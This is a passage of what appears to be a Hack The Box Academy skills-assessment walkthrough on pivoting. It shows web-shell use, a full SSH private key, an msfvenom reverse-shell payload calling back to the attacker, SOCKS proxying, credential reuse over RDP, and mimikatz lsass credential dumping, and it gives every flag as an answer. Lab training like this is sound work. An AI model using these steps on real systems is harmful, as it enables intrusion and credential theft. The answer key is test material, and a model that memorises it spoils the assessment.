![[HTB Solutions/CPTS/z. images/1bc3162539c34adf59727f2cba93d791_MD5.jpg]]

Students need to set `127.0.0.1:1080` as the proxy's socket and use `SOCKS5`:

![[HTB Solutions/CPTS/z. images/33c4f721c281e6c1d1781b6d78218797_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/ae9b557bb111e87b012732cc65bd23be_MD5.jpg]]

At last, students need to use `mstsc.exe` to connect to the internal node at 172.16.6.155 using the credentials `jason:WellConnected123!`:

![[HTB Solutions/CPTS/z. images/c7535ebcd1e78b268b71bab6cab8d1ca_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/e3221ad611ad0b8beb99fd53dc00c512_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/7676ee8a20bcc4903d8ce7e4233260bb_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/2d2d0926d80030794978e14754dc051d_MD5.jpg]]

Once successfully connected, students will find the flag `H0pping@roundwithRDP!` on the desktop:

![[HTB Solutions/CPTS/z. images/7a999bc13d2f8436043b0ae7a04fad0b_MD5.jpg]]

Answer: `H0pping@roundwithRDP!`

# Skills Assessment

## Question 1

### "Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer."

After spawning the target machine, students need to navigate to its website's root webpage to find the web shell left behind:

![[HTB Solutions/CPTS/z. images/a79df906edf088396a76450c761b343f_MD5.jpg]]

When changing directories to `/home/` and listing its contents, students will find two directories `/administrator/` and `/webadmin/`:

Code: shell

```shell
cd /home/
ls
```

```
p0wny@shell:…/www/html# cd /home/
p0wny@shell:/home# ls

administrator
webadmin
```

Then, when navigating to `webadmin/`, students will find two files `for-admin-eyes-only` and `id_rsa`:

Code: shell

```shell
cd webadmin
ls
```

```
p0wny@shell:/home# cd webadmin/

p0wny@shell:/home/webadmin# ls
for-admin-eyes-only
id_rsa
```

`id_rsa` is a SSH private key, therefore, `webadmin` is the name of the user's directory where credentials that can be used for pivoting or tunneling to another host in the network exist:

Code: shell

```shell
file id_rsa
```

```
p0wny@shell:/home/webadmin# file id_rsa

id_rsa: OpenSSH private key
```

Answer: `webadmin`

# Skills Assessment

## Question 2

### "Submit the credentials found in the user's home directory. (Format: user:password)"

Using the web shell from the previous question, which is inside the `webadmin` directory, students need to use `cat` on the file `for-admin-eyes-only`:

Code: shell

```shell
cat for-admin-eyes-only
```

```
p0wny@shell:/home/webadmin# cat for-admin-eyes-only

# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

From the above note, students will discover the credentials `mlefay:Plain Human work!`.

Answer: `mlefay:Plain Human work!`

# Skills Assessment

## Question 3

### "Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer."

Using the web shell from question 1 which is inside the `webadmin` directory, students need to use `cat` on the file `id_rsa` and save it inside a file within `Pwnbox`/`PMVPN`:

Code: shell

```shell
cat id_rsa
```

```
p0wny@shell:/home/webadmin# cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Subsequently, students need to change the permissions of the file to `600` using `chmod`:

Code: shell

```shell
chmod 600 id_rsa
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ chmod 600 id_rsa
```

Then, students need to use the private key to connect to the spawned target machine over SSH, utilizing the same username `webadmin`:

Code: shell

```shell
ssh -i id_rsa webadmin@STMIP
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ ssh -i id_rsa webadmin@10.129.88.197

The authenticity of host '10.129.88.197 (10.129.88.197)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.88.197' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

<SNIP>

Last login: Sun May 22 20:42:25 2022
webadmin@inlanefreight:~$
```

After connecting successfully and checking the network interfaces, students will notice that the machine is on the `172.16.5.0/16` network:

Code: shell

```shell
ip a
```

```
webadmin@inlanefreight:~$ ip a

<SNIP>
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:48:60 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:4860/64 scope link 
       valid_lft forever preferred_lft forever
```

Therefore, students need to use a ping sweep to enumerate other hosts on the same network. Students will find that the other active host has the IP address `172.16.5.35`.:

Code: shell

```shell
for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

```
webadmin@inlanefreight:~$ for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.771 ms
```

Answer: `172.16.5.35`

# Skills Assessment

## Question 4

### "Use the information you gathered to pivot to the discovered host. Submit the contents of C:\\Flag.txt as the answer."

First, students need to generate a Linux `meterpreter` payload to setup for pivoting through `Metasploit`:

Code: shell

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.28 LPORT=9001 -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: 99c0b43c4bec2bdc280741d8f3e40338.elf
```

Subsequently, students need to transfer the payload to the spawned target machine using `scp`, utilizing the private key that was attained previously:

Code: shell

```shell
scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@STMIP:~/
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@10.129.88.197:~/

99c0b43c4bec2bdc280741d8f3e40338.elf     100%  250    21.2KB/s   00:00
```

Then, on `Pwnbox`/`PMVPN`, students need to run `msfconsole` and use the `exploit/multi/handler` module to catch the call-back from the spawned target machine:

Code: shell

```shell
msfconsole -q
use exploit/multi/handler
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

Students also need to set the module's options accordingly, most importantly setting `LPORT` to be the same port that was specified when generating the `msfvenom` payload (9001 in here):

Code: shell

```shell
set LHOST 0.0.0.0
set LPORT PWNPO
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
```

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 0.0.0.0

LHOST => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 9001
LPORT => 9001
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 0.0.0.0:9001
```

Then, if not connected to the spawned target over SSH, students need to do so:

Code: shell

```shell
ssh -i id_rsa webadmin@STMIP
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ ssh -i id_rsa webadmin@10.129.88.197

The authenticity of host '10.129.88.197 (10.129.88.197)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.88.197' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

<SNIP>

Last login: Sun May 22 20:42:25 2022
webadmin@inlanefreight:~$
```

Then, students need to execute the transferred `msfvenom` payload after making it executable:

Code: shell

```shell
chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
./99c0b43c4bec2bdc280741d8f3e40338.elf
```

```
webadmin@inlanefreight:~$ chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
webadmin@inlanefreight:~$ ./99c0b43c4bec2bdc280741d8f3e40338.elf
```

Students will notice that a `Meterpreter` session has been established successfully on the `exploit/multi/handler` module:

```
[*] Sending stage (3020772 bytes) to 10.129.88.197
[*] Meterpreter session 1 opened (10.10.15.28:9001 -> 10.129.88.197:37020) at 2022-11-20 12:49:56 +0000

(Meterpreter 1)(/home/webadmin) >
```

Thereafter, students need to set up the `auxiliary/server/socks_proxy` module to configure a local proxy on `Pwnbox`/`PMVPN`. Still, first, students need to background the current `Meterpreter` session and then proceed to use and set the options of `socks_proxy`:

Code: shell

```shell
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
```

```
(Meterpreter 1)(/home/webadmin) > bg

[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use auxiliary/server/socks_proxy
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 9050
SRVPORT => 9050
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set VERSION 4a
VERSION => 4a
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

Once the `SOCKS proxy` server has started, students need to attach back to session 1 and then use `autoroute` to add routes to the `172.16.5.0/16` network:

Code: shell

```shell
sessions -i 1
run autoroute -s 172.16.5.0/16
```

```
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/home/webadmin) > run autoroute -s 172.16.5.0/16
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.0.0...
[+] Added route to 172.16.5.0/255.255.0.0 via 10.129.201.127
[*] Use the -p option to list all active routes
```

Once the route has been added from `Pwnbox`/`PMVPN`, students need to enumerate `172.15.5.25` using `Nmap` through `proxychains`:

Code: shell

```shell
proxychains nmap 172.16.5.35 -Pn -sT
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ proxychains nmap 172.16.5.35 -Pn -sT

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 13:26 GMT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.35:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.35:21-<--denied
<SNIP>
Nmap scan report for 172.16.5.35
Host is up (0.015s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

From the output of `Nmap`, students will notice that port 3389 on 172.16.5.35 is open; therefore, they need to test for the "credentials reuse" security misconfiguration and see whether the credentials `mlefay:Plain Human work!` will work by connecting with `xfreerdp` through `proxychains`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'

ProxyChains-3.1 (http://proxychains.sf.net)
[13:32:49:452] [7305:7306] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
<SNIP>
[13:32:50:928] [7305:7306] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.5.35:3389 (RDP-Server):
	Common Name: PIVOT-SRV01.INLANEFREIGHT.LOCAL
	Subject:     CN = PIVOT-SRV01.INLANEFREIGHT.LOCAL
	Issuer:      CN = PIVOT-SRV01.INLANEFREIGHT.LOCAL
	Thumbprint:  27:24:6a:2a:be:bc:c1:c8:a8:a0:a0:23:4f:e2:66:6c:61:7f:2c:4c:31:29:5c:c0:52:9f:0f:ab:52:20:a1:c3
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

![[HTB Solutions/CPTS/z. images/e4a84451cd976fdfc0b070a1eb9ec1b1_MD5.jpg]]

Students will notice that, indeed the credentials have been reused. At last, students need to print out the contents of the flag file "Flag.txt", which is under the `C:\` directory, to find `S1ngl3-Piv07-3@sy-Day`:

```powershell
type C:\Flag.txt
```
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mlefay> type C:\Flag.txt

S1ngl3-Piv07-3@sy-Day
```

Answer: `S1ngl3-Piv07-3@sy-Day`

# Skills Assessment

## Question 5

### "In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?"

Students first need to download [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip) and then unzip `mimikatz_trunk.zip`:

```shell
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
```
```
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-w1xogjok4c]─[~]
└──╼ [★]$ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

--2022-11-20 16:18:42--  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
Saving to: ‘mimikatz_trunk.zip’

mimikatz_trunk.zip                      100%[=============================================================================>]   1.15M  --.-KB/s    in 0.02s   

2022-11-20 16:18:43 (64.6 MB/s) - ‘mimikatz_trunk.zip’ saved [1206166/1206166]

┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-w1xogjok4c]─[~]
└──╼ [★]$ unzip mimikatz_trunk.zip 
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar      
  inflating: mimicom.idl             
  inflating: README.md               
   creating: Win32/
<SNIP>
```

Then, within the `x64` folder, students need to copy and paste `mimikatz.exe` into `172.16.5.35` (with the credentials `mlefay:Plain Human work!`) utilizing the same `xfreerdp` session from the previous section:

![[HTB Solutions/CPTS/z. images/ac0ffef01ba4ec086270d6355cff383c_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/5e2839adb79b08e3ba47bb5aa6747a64_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/8098307c2f780c164335008f149859e9_MD5.jpg]]

Subsequently, students need to create a dump file of `lsass.exe`; first, they need to run `Task Manager` as administrator:

![[HTB Solutions/CPTS/z. images/a947e7fe70c1fe4b60f55165d5f0f0fc_MD5.jpg]]

Then, once they find `Local Security Authority Process`, students need to right-click and select `Create dump file`:

![[HTB Solutions/CPTS/z. images/a4d72164aff47298469051dc05ba7910_MD5.jpg]]

Students will be notified that the dump has been written to `C:\Users\mlefay\AppData\Local\Temp\lsass.DMP`:

![[HTB Solutions/CPTS/z. images/5cd4c2d24d1d912b1f7551d0d3165661_MD5.jpg]]

Thereafter, students then need to launch `mimikatz` by double-clicking on its icon:

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
Switch to MINIDUMP : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP'
```

Students need to use the `sekurlsa` module with `LogonPasswords` to list all available provider credentials:

```cmd
sekurlsa::LogonPasswords
```
```
mimikatz # sekurlsa::LogonPasswords

Opening : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP' file for minidump...
```

From the output of `sekurlsa::LogonPasswords`, students will find that the user `vfrank` is vulnerable, as the user's password is exposed to be `Imply wet Unmasked!`:

```
Authentication Id : 0 ; 160843 (00000000:0002744b)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 11/20/2022 10:09:13 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
        ssp :
        credman :
```

Answer: `vfrank`

# Skills Assessment

## Question 6

### "For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\\Flag.txt located on the workstation."

Utilizing the same `xfreerdp` session from the previous section, students need to enumerate the `172.16.6.0/16` network utilizing a PowerShell ping sweep:

```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mlefay> 1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
172.16.6.1: False
172.16.6.2: False
<SNIP>
172.16.6.23: False
172.16.6.24: False
172.16.6.25: True
172.16.6.26: False
```

The `172.16.6.25` host is alive; therefore, using the credentials `vfrank:Imply wet Unmasked!` attained in the previous section, students need to connect to the host with RDP:

![[HTB Solutions/CPTS/z. images/8cd2ff70fe081f3015cf304f49415d69_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/d02b4f98edefc156047603ec3a5c7113_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/83c27c9760e31e0cf49e8d137d11b7e5_MD5.jpg]]

Once connected successfully, students need to open `CMD`:

![[HTB Solutions/CPTS/z. images/ad3b2bf2ae7bb19739da8f846a0f5d3e_MD5.jpg]]

At last, students need to print out the contents of the flag file "Flag.txt", which is under the `C:\` directory, to attain `N3tw0rk-H0pp1ng-f0R-FuN`:

```cmd
type C:\Flag.txt
```
```
Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\vfrank>type C:\Flag.txt
N3tw0rk-H0pp1ng-f0R-FuN
```

Answer: `N3tw0rk-H0pp1ng-f0R-FuN`

# Skills Assessment

## Question 7

### "Submit the contents of C:\\Flag.txt located on the Domain Controller."

Using the same RDP connection to the `172.16.6.25` host, students need to open `This PC` and then double-click on the network share `AutomateDCAdmin (Z:)`:

![[HTB Solutions/CPTS/z. images/3106f2630c35927a4c940e2261b93a3b_MD5.jpg]]

Within it, students will find the flag file "Flag.txt", with its contents being `3nd-0xf-Th3-R@inbow!`:

![[HTB Solutions/CPTS/z. images/cec1bea0fbfa653c6bd5ac99e44b25fe_MD5.jpg]]

Answer: `3nd-0xf-Th3-R@inbow!`